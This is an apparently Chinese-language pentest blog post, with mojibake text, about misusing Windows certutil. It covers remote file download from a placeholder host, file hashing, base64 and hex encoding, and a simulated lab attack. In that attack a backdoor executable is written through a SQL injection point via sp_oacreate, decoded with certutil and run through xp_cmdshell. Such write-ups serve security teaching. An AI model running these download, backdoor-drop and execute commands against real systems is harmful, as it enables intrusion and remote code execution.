<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>æŠ€å·§ Tricks | certUtil å‘½ä»¤æ¸—é€å®æˆ˜åˆ©ç”¨ - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">æŠ€å·§ Tricks | certUtil å‘½ä»¤æ¸—é€å®æˆ˜åˆ©ç”¨</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>9 Minutes</li><li><i class="icon icon-calendar"></i>December 1, 2019</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="æŠ€å·§-Tricks-certUtil-å‘½ä»¤æ¸—é€å®æˆ˜åˆ©ç”¨"><a href="#æŠ€å·§-Tricks-certUtil-å‘½ä»¤æ¸—é€å®æˆ˜åˆ©ç”¨" class="headerlink" title="æŠ€å·§ Tricks | certUtil å‘½ä»¤æ¸—é€å®æˆ˜åˆ©ç”¨"></a><center>æŠ€å·§ Tricks | certUtil å‘½ä»¤æ¸—é€å®æˆ˜åˆ©ç”¨</center></h2><h3 id="ğŸŒ-0x00-å‰è¨€"><a href="#ğŸŒ-0x00-å‰è¨€" class="headerlink" title="ğŸŒ 0x00 å‰è¨€"></a>ğŸŒ 0x00 å‰è¨€</h3><p>certutil.exe æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œç¨‹åºï¼Œä½œä¸ºè¯ä¹¦æœåŠ¡çš„ä¸€éƒ¨åˆ†å®‰è£…ã€‚å¯ä»¥ä½¿ç”¨ certutil.exe è½¬å‚¨å’Œæ˜¾ç¤ºè¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰é…ç½®ä¿¡æ¯ï¼Œé…ç½®è¯ä¹¦æœåŠ¡ï¼Œå¤‡ä»½å’Œè¿˜åŸ CA ç»„ä»¶ï¼Œä»¥åŠéªŒè¯è¯ä¹¦ã€å¯†é’¥å¯¹å’Œè¯ä¹¦é“¾ã€‚</p>
<p>åº”æ€¥å“åº”ä¸­ç»å¸¸ä½¿ç”¨ certutil å‘½ä»¤æ¥è®¡ç®—æ ·æœ¬ Hashï¼Œæ¸—é€æµ‹è¯•é¡¹ç›®ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤æ¥è¿œç¨‹ä¸‹è½½æˆ–å†™å…¥æ–‡ä»¶æ¥è¿›è¡Œä¸‹ä¸€æ­¥åŠ¨ä½œï¼ŒåŒæ—¶è¿˜å¯ä»¥è§£å†³æ¢è¡Œé—®é¢˜ã€‚</p>
<h3 id="ğŸ“-0x01-è¿œç¨‹æ–‡ä»¶ä¸‹è½½"><a href="#ğŸ“-0x01-è¿œç¨‹æ–‡ä»¶ä¸‹è½½" class="headerlink" title="ğŸ“ 0x01 è¿œç¨‹æ–‡ä»¶ä¸‹è½½"></a>ğŸ“ 0x01 è¿œç¨‹æ–‡ä»¶ä¸‹è½½</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -urlcache -split -f http://1.1.1.1/a.exe c:\temp\a.exe</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.24.20.png" alt="å±å¹•å¿«ç…§ 2020-02-03 ä¸‹åˆ2.24.20"></p>
<h3 id="ğŸ“-0x02-è®¡ç®—æ–‡ä»¶-Hash"><a href="#ğŸ“-0x02-è®¡ç®—æ–‡ä»¶-Hash" class="headerlink" title="ğŸ“ 0x02 è®¡ç®—æ–‡ä»¶ Hash"></a>ğŸ“ 0x02 è®¡ç®—æ–‡ä»¶ Hash</h3><h4 id="âš™ï¸-MD4"><a href="#âš™ï¸-MD4" class="headerlink" title="âš™ï¸ MD4"></a>âš™ï¸ MD4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -hashfile lcx.exe MD4</span><br></pre></td></tr></table></figure>

<h4 id="âš™ï¸-MD5"><a href="#âš™ï¸-MD5" class="headerlink" title="âš™ï¸ MD5"></a>âš™ï¸ MD5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -hashfile lcx.exe MD5</span><br></pre></td></tr></table></figure>

<h4 id="âš™ï¸-SHA-1"><a href="#âš™ï¸-SHA-1" class="headerlink" title="âš™ï¸ SHA-1"></a>âš™ï¸ SHA-1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -hashfile lcx.exe SHA1</span><br></pre></td></tr></table></figure>

<h4 id="âš™ï¸-SHA-256"><a href="#âš™ï¸-SHA-256" class="headerlink" title="âš™ï¸ SHA-256"></a>âš™ï¸ SHA-256</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -hashfile lcx.exe SHA256</span><br></pre></td></tr></table></figure>

<h4 id="âš™ï¸-SHA-512"><a href="#âš™ï¸-SHA-512" class="headerlink" title="âš™ï¸ SHA-512"></a>âš™ï¸ SHA-512</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -hashfile lcx.exe SHA512</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.08.36.png" alt="å±å¹•å¿«ç…§ 2020-02-03 ä¸‹åˆ2.08.36"></p>
<h3 id="ğŸ“-0x03-ä»»æ„æ–‡ä»¶ç¼–ç "><a href="#ğŸ“-0x03-ä»»æ„æ–‡ä»¶ç¼–ç " class="headerlink" title="ğŸ“ 0x03 ä»»æ„æ–‡ä»¶ç¼–ç "></a>ğŸ“ 0x03 ä»»æ„æ–‡ä»¶ç¼–ç </h3><h4 id="âš™ï¸-Base64-Encode"><a href="#âš™ï¸-Base64-Encode" class="headerlink" title="âš™ï¸ Base64 Encode"></a>âš™ï¸ Base64 Encode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -encode lcx.exe c:\temp\out.txt</span><br></pre></td></tr></table></figure>

<h4 id="âš™ï¸-Base64-Decode"><a href="#âš™ï¸-Base64-Decode" class="headerlink" title="âš™ï¸ Base64 Decode"></a>âš™ï¸ Base64 Decode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -decode c:\temp\out.txt c:\temp\demo.exe</span><br></pre></td></tr></table></figure>

<h4 id="âš™ï¸-HEX-Encode"><a href="#âš™ï¸-HEX-Encode" class="headerlink" title="âš™ï¸ HEX Encode"></a>âš™ï¸ HEX Encode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -encodehex lcx.exe c:\temp\hex.txt</span><br></pre></td></tr></table></figure>

<h4 id="âš™ï¸-HEX-Decode"><a href="#âš™ï¸-HEX-Decode" class="headerlink" title="âš™ï¸ HEX Decode"></a>âš™ï¸ HEX Decode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -decodehex c:\temp\hex.txt c:\temp\test.exe</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-0x04-è¯»å–è¯ä¹¦ä¿¡æ¯"><a href="#ğŸ“-0x04-è¯»å–è¯ä¹¦ä¿¡æ¯" class="headerlink" title="ğŸ“ 0x04 è¯»å–è¯ä¹¦ä¿¡æ¯"></a>ğŸ“ 0x04 è¯»å–è¯ä¹¦ä¿¡æ¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -dump ca-burdle.crt</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-0x05-æ¨¡æ‹Ÿå®æˆ˜åˆ©ç”¨"><a href="#ğŸ“-0x05-æ¨¡æ‹Ÿå®æˆ˜åˆ©ç”¨" class="headerlink" title="ğŸ“ 0x05 æ¨¡æ‹Ÿå®æˆ˜åˆ©ç”¨"></a>ğŸ“ 0x05 æ¨¡æ‹Ÿå®æˆ˜åˆ©ç”¨</h3><p>æ­¤æ¬¡æ¨¡æ‹Ÿå®æˆ˜çš„ç¯å¢ƒä¸ºç›®æ ‡ç³»ç»Ÿå…·æœ‰ SQL æ³¨å…¥æ¼æ´ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Target - server 08</span><br><span class="line">172.16.232.140</span><br><span class="line"></span><br><span class="line">// Hacker - win 7</span><br><span class="line">172.16.232.136</span><br></pre></td></tr></table></figure>

<h4 id="âš™ï¸-ç”Ÿæˆåé—¨"><a href="#âš™ï¸-ç”Ÿæˆåé—¨" class="headerlink" title="âš™ï¸ ç”Ÿæˆåé—¨"></a>âš™ï¸ ç”Ÿæˆåé—¨</h4><p><img src="http://47.95.140.43/tu/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.37.15.png" alt="å±å¹•å¿«ç…§ 2020-02-03 ä¸‹åˆ2.37.15"></p>
<h4 id="âš™ï¸-æ–‡ä»¶è½¬ç "><a href="#âš™ï¸-æ–‡ä»¶è½¬ç " class="headerlink" title="âš™ï¸ æ–‡ä»¶è½¬ç "></a>âš™ï¸ æ–‡ä»¶è½¬ç </h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; certutil -encode fuckthem.exe c:\temp\demo.txt</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.41.54.png" alt="å±å¹•å¿«ç…§ 2020-02-03 ä¸‹åˆ2.41.54"></p>
<h4 id="âš™ï¸-å†™å…¥åé—¨"><a href="#âš™ï¸-å†™å…¥åé—¨" class="headerlink" title="âš™ï¸ å†™å…¥åé—¨"></a>âš™ï¸ å†™å…¥åé—¨</h4><ol>
<li><p>ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ å†™å…¥</p>
</li>
<li><p>SQL æ³¨å…¥ç‚¹å†™å…¥åé—¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare @o int, @f int, @t int, @ret int</span><br><span class="line">exec sp_oacreate &apos;scripting.filesystemobject&apos;, @o out</span><br><span class="line">exec sp_oamethod @o, &apos;createtextfile&apos;, @f out, &apos;c:\Windows\temp\readme.txt&apos;, 1</span><br><span class="line">exec @ret = sp_oamethod @f, &apos;writeline&apos;, NULL, &apos;xxxxxxxxx&apos;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h4 id="âš™ï¸-æ‰§è¡Œç¨‹åº"><a href="#âš™ï¸-æ‰§è¡Œç¨‹åº" class="headerlink" title="âš™ï¸ æ‰§è¡Œç¨‹åº"></a>âš™ï¸ æ‰§è¡Œç¨‹åº</h4><ol>
<li><p>ä¸€å¥è¯è½¬ç ç›´æ¥æ‰§è¡Œ</p>
</li>
<li><p>SQL è¯­å¥æ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &apos;certutil -decode c:\windows\Temp\readme.txt c:\windows\Temp\update.exe &amp; c:\windows\Temp\update.exe&apos;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="âš ï¸-0x06-åè®°"><a href="#âš ï¸-0x06-åè®°" class="headerlink" title="âš ï¸ 0x06 åè®°"></a>âš ï¸ 0x06 åè®°</h3><p>éœ€è¦æ³¨æ„çš„å‡ ç‚¹ï¼š</p>
<ol>
<li><p>åœ¨ cmd ä¸­ä¸€æ¬¡æ‰§è¡Œå¤šæ¡å‘½ä»¤è¯­å¥ï¼Œç”¨ &amp;&amp;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// åœ¨è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶æ—¶éœ€è¦ç»å¯¹è·¯å¾„</span><br><span class="line">c:\&gt; certutil -decode .\demo.txt .\update.exe &amp;&amp; c:\update.exe</span><br></pre></td></tr></table></figure>
</li>
<li><p>åœ¨ powershell ä¸­ä¸€æ¬¡æ‰§è¡Œå¤šæ¡å‘½ä»¤è¯­å¥ï¼Œç”¨ ;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS c:\&gt; certutil -decode .\demo.txt .\update.exe; c:\update.exe</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><img src="http://47.95.140.43/tu/certutil/a.png" alt="a"></p>
</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck71hr9ll0009c2ozeyc4l8v6" data-title="æŠ€å·§ Tricks | certUtil å‘½ä»¤æ¸—é€å®æˆ˜åˆ©ç”¨" data-url="http://www.naykcin.top/2019/12/01/certutil/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
var duoshuoQuery = {short_name: siteName};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0] 
  || document.getElementsByTagName('body')[0]).appendChild(ds);
})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/01/02/linux-emergency/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2019/11/24/burpæ’ä»¶jsEncrypterç”¨æ³•/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">Â© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
window.onload = function () {
  wrap.className += ' done';
}</script></body></html>